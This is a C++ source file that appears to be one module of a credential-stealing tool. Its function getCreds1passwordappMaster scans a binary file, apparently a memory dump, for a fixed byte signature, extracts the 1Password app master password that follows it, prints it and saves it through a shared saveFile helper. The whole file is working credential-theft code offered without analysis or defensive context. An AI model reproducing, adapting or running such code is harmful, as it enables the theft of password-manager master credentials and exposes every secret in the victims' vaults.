#pragma once
#include <iostream>
#include <fstream>
#include <vector>
#include <string>
#include "../../core/saveFile.h"

void getCreds1passwordappMaster(std::string filename) {
    std::ifstream file(filename, std::ios::binary);

    if (!file.is_open()) {
        std::cerr << "Error opening the file." << std::endl;
    }

    std::vector<unsigned char> searchPattern = { 0x2f, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x20 };
    std::vector<unsigned char> foundData;

    while (!file.eof()) {
        unsigned char c;
        file.read(reinterpret_cast<char*>(&c), sizeof(c));

        if (c == searchPattern[foundData.size()]) {
            foundData.push_back(c);
            if (foundData.size() == searchPattern.size()) {
                // We found the search pattern, now collect data until having two binary spaces (00)
                std::vector<unsigned char> extractedData;
                int consecutiveSpaces = 0;

                while (!file.eof()) {
                    file.read(reinterpret_cast<char*>(&c), sizeof(c));
                    if (c == 0x00) {
                        consecutiveSpaces++;
                        if (consecutiveSpaces == 2) {
                            break; // (00) found
                        }
                    }
                    else {
                        consecutiveSpaces = 0;
                    }
                    extractedData.push_back(c);
                }

                // Convert the binary data to a UTF-8 string
                std::string utf8ExtractedData(extractedData.begin(), extractedData.end());

                // Print the extracted UTF-8 string
                std::cout << "Pattern Data: " + utf8ExtractedData << std::endl;

                //Save into file
                saveFile(utf8ExtractedData);

                foundData.clear();
            }
        }
        else {
            foundData.clear();
        }
    }

    file.close();
}
